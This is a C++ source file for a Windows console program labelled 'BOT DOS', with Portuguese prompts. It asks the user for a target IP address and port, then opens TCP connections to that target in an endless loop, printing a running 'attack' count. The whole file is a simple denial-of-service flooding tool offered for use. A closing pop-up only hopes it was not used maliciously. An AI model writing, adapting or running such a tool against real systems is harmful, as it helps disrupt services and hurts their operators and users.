#include "socket.h"

int main(void)
{
	SetConsoleTitle("BOT DOS ( BY : SRNAJA )");
	int port, count;
	char ip[50];
	std::cout << "DIGITE O IP QUE VOCE DESEJA DERRUBAR : \n";
	std::cin >> ip;
	std::cout << "DIGITE A PORTA QUE VOCE DESEJA DERRUBAR : \n";
	std::cin >> port;
	std::system("cls");

	count = 0x0;

	while (true) {
		Sleep(300);

		while (true) {
			Socket so(ip, port, 10, SOCK_STREAM, AF_INET, 0);

			so.registerAddr();

			bool t = so.socket_();
			if (!t) {
				std::cout << "problema na criacao do socket!" << std::endl;
				break;
			}

			bool f = so.connect_();

			if (!f) {
				std::cout << "problema na conexao" << std::endl;
				break;
			}

			count = count + 1;

			std::cout << "\033[1;31mATACANDO \033[1;32mIP [" << ip << "] \033[1;34mPORT (" << port << ")" << " \033[1;31mQUANTIDADE DE PACOTES ENVIADOS : \033[1;34m" << count << "\n";
		}

	}


	std::cout << "\033[1;31mDOS PROGRAMA PARADO!\n";

	MessageBox(NULL, "ESPERO QUE VOCE NAO TENHA UTILIZADO O 'BOT DOS ( BY : SRNAJA )' PARA FINS MALICIOSO ", "BOT DOS(BY : SRNAJA)", MB_OK | MB_ICONEXCLAMATION);

	return 0;
}
